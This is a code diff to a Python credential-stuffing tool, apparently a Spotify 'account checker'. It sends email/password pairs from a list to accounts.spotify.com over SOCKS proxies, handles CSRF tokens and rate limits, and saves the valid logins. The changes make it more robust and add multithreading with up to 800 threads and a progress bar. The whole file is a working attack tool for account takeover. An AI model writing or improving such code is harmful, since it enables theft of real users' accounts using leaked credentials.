@@ -75,17 +75,23 @@ remember=true&username={}&password={}&csrf_token={}'''.format(str(len('remember=
 def make_post(account, csrf_token):
 
     while True:
-        no_ssl_socket = socks.socksocket()
-        ssl_socket = ssl.wrap_socket(no_ssl_socket, ssl_version=ssl.PROTOCOL_SSLv23)
+        try:
+            try:
+                no_ssl_socket = socks.socksocket()
+                ssl_socket = ssl.wrap_socket(no_ssl_socket, ssl_version=ssl.PROTOCOL_SSLv23)
 
-        ssl_socket.connect(('accounts.spotify.com', 443))
-        ssl_socket.sendall(post_data(account[0], account[1], csrf_token))
-        api_data = ssl_socket.recv(10000)
-        if '429 Too' in api_data.decode():
-            time.sleep(1)
-            continue
-        api_data_plain = plain_http_request_to_json(api_data)
-        return api_data_plain
+                ssl_socket.connect(('accounts.spotify.com', 443))
+                ssl_socket.sendall(post_data(account[0], account[1], csrf_token))
+                api_data = ssl_socket.recv(10000)
+                if '429 Too' in api_data.decode():
+                    time.sleep(1)
+                    continue
+                api_data_plain = plain_http_request_to_json(api_data)
+                return api_data_plain
+            except Exception as e:
+                continue
+        except Exception as e:
+            sys.exit()
 
 def output(email, password):
     OT.append([email, password])
@@ -113,18 +119,20 @@ def load_list(list):
 def check_account(account):
     try:
         while True:
-            no_ssl_socket = socks.socksocket()
-            ssl_socket = ssl.wrap_socket(no_ssl_socket, ssl_version=ssl.PROTOCOL_SSLv23)
-            ssl_socket.connect(('accounts.spotify.com', 443))
-            ssl_socket.sendall(b'GET / HTTP/1.1\r\nHost: accounts.spotify.com\r\n\r\n')
-            spotify_cookies_data = ssl_socket.recv(10000)
-            if '429 Too' in spotify_cookies_data.decode():
-                time.sleep(1)
+            try:
+                no_ssl_socket = socks.socksocket()
+                ssl_socket = ssl.wrap_socket(no_ssl_socket, ssl_version=ssl.PROTOCOL_SSLv23)
+                ssl_socket.connect(('accounts.spotify.com', 443))
+                ssl_socket.sendall(b'GET / HTTP/1.1\r\nHost: accounts.spotify.com\r\n\r\n')
+                spotify_cookies_data = ssl_socket.recv(10000)
+                if '429 Too' in spotify_cookies_data.decode():
+                    time.sleep(1)
+                    continue
+                else:
+                    break
+            except Exception as e:
                 continue
-            else:
-                break
     except Exception as e:
-        colors.error('Error! | '+str(e))
         sys.exit()
     csrf_token = get_csrf_token(spotify_cookies_data)
     if true_or_false_json(make_post(account, csrf_token)):
@@ -134,7 +142,7 @@ def thread(list_):
     for account in list_:
         check_account(account)
 
-def calculate(n):
+def calculate(n, t):
     valid_n = []
 
     for r in range(n):
@@ -144,6 +152,9 @@ def calculate(n):
             valid_n.append(r)
     if len(valid_n) == 2:
         return 1
+    if valid_n[len(valid_n)-1] > 700:
+        if not t == 1:
+            return 800
     return valid_n[len(valid_n)-1]
 
 def explode(array, parts):
@@ -171,12 +182,14 @@ def start():
     if not args.nothreads:
         colors.info('Repartiendo la carga...')
 
-        c = explode(ACCOUNTS, calculate(len(ACCOUNTS)))
-        colors.info('Numero de threads: '+str(calculate(len(ACCOUNTS))))
+        c = explode(ACCOUNTS, calculate(len(ACCOUNTS), 1))
+        colors.info('Numero de threads: '+str(calculate(len(ACCOUNTS), 0)))
         colors.correct('Iniciando...\n')
 
-        pool = Pool(calculate(len(ACCOUNTS)))
-        res = pool.map(thread, c)
+        pool = Pool(calculate(len(ACCOUNTS), 0))
+
+        for _ in tqdm(pool.imap_unordered(thread, c), total=calculate(len(ACCOUNTS), 1), desc="Procesando"):
+            pass
 
         with open(args.output, 'w') as output:
             for x in OT:
